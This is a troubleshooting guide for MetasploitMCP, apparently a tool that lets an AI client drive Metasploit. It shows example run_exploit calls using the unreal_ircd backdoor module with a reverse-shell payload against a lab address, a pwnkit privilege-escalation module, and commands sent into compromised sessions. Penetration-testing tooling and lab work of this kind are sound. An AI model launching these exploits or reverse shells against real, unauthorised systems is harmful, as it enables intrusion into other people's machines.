# Troubleshooting Guide

This guide helps diagnose and resolve common issues when using MetasploitMCP.

## Connection Issues

### "Connection refused" Error

**Symptom:**
```
Error: Connection refused to http://127.0.0.1:8085
```

**Solutions:**

1. **Verify MCP Server is Running:**
   ```bash
   poetry run python MetasploitMCP.py --transport http --host 127.0.0.1 --port 8085
   ```

2. **Check the Port:**
   Ensure no other service is using port 8085:
   ```bash
   netstat -tlnp | grep 8085
   ```

### "Failed to connect to Metasploit RPC"

**Symptom:**
```
Error: Failed to connect to Metasploit RPC at 127.0.0.1:55553
```

**Solutions:**

1. **Start Metasploit RPC:**
   ```bash
   msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553
   ```

2. **Verify Environment Variables:**
   ```bash
   export MSF_PASSWORD=yourpassword
   export MSF_SERVER=127.0.0.1
   export MSF_PORT=55553
   ```

### HTTP 406 "Not Acceptable" Error

**Symptom:**
```
HTTP Request: POST http://localhost:8085/mcp "HTTP/1.1 406 Not Acceptable"
```

**Cause:** The client is not sending the correct `Accept` header.

**Solution:**
Ensure your HTTP client sends:
```
Accept: application/json, text/event-stream
Content-Type: application/json
```

FastMCP's streamable-http transport can return either JSON or Server-Sent Events, so clients must accept both formats.

## Exploit Issues

### "Invalid payload" Error

**Symptom:**
```
Invalid payload specified: linux/x86/shell/reverse_tcp
```

**Cause:** Architecture mismatch (x86 vs x64) between payload and target.

**Solution:**

1. **Use `exploit_module` parameter** to get compatible payloads:
   ```python
   # Get ONLY compatible payloads for your exploit
   payloads = list_payloads(exploit_module="linux/local/cve_2021_4034_pwnkit_lpe_pkexec")
   ```

2. **Match architecture:**
   - `x86` = 32-bit (older systems)
   - `x64` = 64-bit (modern systems)
   
   **x86 payloads do NOT work on x64 targets** in most cases.

### "Payload options in wrong location" Error

**Symptom:**
```
CONFIGURATION ERROR: Payload options (LHOST, LPORT) cannot be set on the exploit module
```

**Cause:** Payload options like `LHOST` and `LPORT` are in `options` instead of `payload_options`.

**Solution:**
Move payload-specific options to `payload_options`:

```python
# ❌ WRONG
await run_exploit(
    module_name='exploit/unix/irc/unreal_ircd_3281_backdoor',
    options={
        'RHOSTS': '10.0.2.15',
        'LHOST': '10.0.0.1',  # ❌ Wrong location
        'LPORT': 4444         # ❌ Wrong location
    },
    payload_name='cmd/unix/reverse'
)

# ✅ CORRECT
await run_exploit(
    module_name='exploit/unix/irc/unreal_ircd_3281_backdoor',
    options={
        'RHOSTS': '10.0.2.15'
    },
    payload_name='cmd/unix/reverse',
    payload_options={
        'LHOST': '10.0.0.1',  # ✅ Correct location
        'LPORT': 4444         # ✅ Correct location
    }
)
```

### "Port already in use" Error

**Symptom:**
```
Cannot start listener: Port 4444 is already in use on 0.0.0.0
```

**Solutions:**

1. **Check existing handlers:**
   ```python
   result = await list_listeners()
   ```

2. **Kill all handler jobs:**
   ```python
   result = await kill_all_handler_jobs()
   ```

3. **Use a different port:**
   Change `LPORT` to an unused port (4445, 4446, etc.)

4. **Check system services:**
   ```bash
   netstat -tlnp | grep 4444
   ```

### "No session established" Warning

**Symptom:**
```
⚠ Test PARTIAL - Exploit ran but no session detected
```

**Possible Causes:**

1. **Network connectivity:** Target can't reach back to LHOST
2. **Firewall:** Blocking reverse connections
3. **Wrong LHOST:** Not reachable from target
4. **Service not vulnerable:** Target may be patched

**Debugging Steps:**

1. **Verify network connectivity:**
   ```bash
   # SSH to target and test reverse connectivity
   ssh user@TARGET
   ping YOUR_LHOST
   nc -zv YOUR_LHOST YOUR_LPORT
   ```

2. **Check firewall:**
   ```bash
   # Allow incoming on LPORT
   sudo ufw allow 4444
   ```

3. **Verify services on target:**
   ```bash
   nmap -sV -p TARGET_PORTS TARGET_IP
   ```

## Listener Issues

### Duplicate Listener Error

**Symptom:** Port conflict when running exploits after starting a listener.

**Cause:** `run_exploit()` automatically creates its own handler. Don't call `start_listener()` first.

**When to use `start_listener()`:**
- For manually generated payloads (from `generate_payload()`)
- For persistent listeners across multiple connection attempts
- For pre-staging listeners before non-Metasploit tools

**When to use `run_exploit()` alone:**
- When running exploits that need reverse connections
- `run_exploit()` handles listener creation automatically

## Session Issues

### Session Commands Timeout

**Symptom:**
```
Session command timed out after 60 seconds
```

**Solutions:**

1. **Increase timeout:**
   ```python
   result = await send_session_command(
       session_id=1,
       command="long_running_command",
       timeout_seconds=300
   )
   ```

2. **Check session health:**
   ```python
   sessions = await list_active_sessions()
   ```

### Sessions Not Cleaning Up

**Symptom:** Old sessions keep ports bound.

**Solution:**
Use the automatic cleanup with job termination:

```python
# Terminate session AND its handler job
result = await terminate_session(session_id=1, kill_associated_job=True)

# Or kill all handler jobs at once
result = await kill_all_handler_jobs()
```

## Testing Issues

### Test Harness Connection Failed

**Symptom:**
```
Error connecting to MCP server at http://127.0.0.1:8085
```

**Checklist:**
1. MCP server is running on the correct port
2. Metasploit RPC is running
3. Environment variables are set
4. Network connectivity between components

**Verification:**
```bash
# Test MCP connection
poetry run python test_mcp_connection.py --url http://localhost:8085
```

## Debugging Tips

### Enable Debug Logging

```bash
LOG_LEVEL=DEBUG poetry run python MetasploitMCP.py --transport http
```

### Test with Verbose Mode

```bash
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --verbose
```

### Check Metasploit Logs

Metasploit logs are located at:
```
~/.msf4/logs/
```

## Getting Help

If issues persist:

1. Check the [API Documentation](API.md)
2. Review the [Development Guide](DEVELOPMENT.md)
3. Enable verbose/debug logging
4. Check Metasploit Framework logs


